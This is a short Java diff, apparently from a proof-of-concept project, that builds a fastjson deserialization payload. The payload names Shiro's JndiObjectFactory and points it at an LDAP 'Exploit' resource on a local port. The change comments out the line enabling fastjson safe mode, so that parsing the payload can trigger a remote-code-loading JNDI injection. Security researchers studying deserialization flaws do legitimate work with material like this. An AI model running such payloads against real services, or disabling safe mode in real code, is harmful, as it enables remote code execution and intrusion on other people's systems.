@@ -41,7 +41,7 @@ public class AppMavenApplication {
 	public static void main(String[] args) {
 		String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
 
-		ParserConfig.getGlobalInstance().setSafeMode(true);
+		// ParserConfig.getGlobalInstance().setSafeMode(true);
 		
 		JSON jsonObject = JSON.parseObject(payload);
 
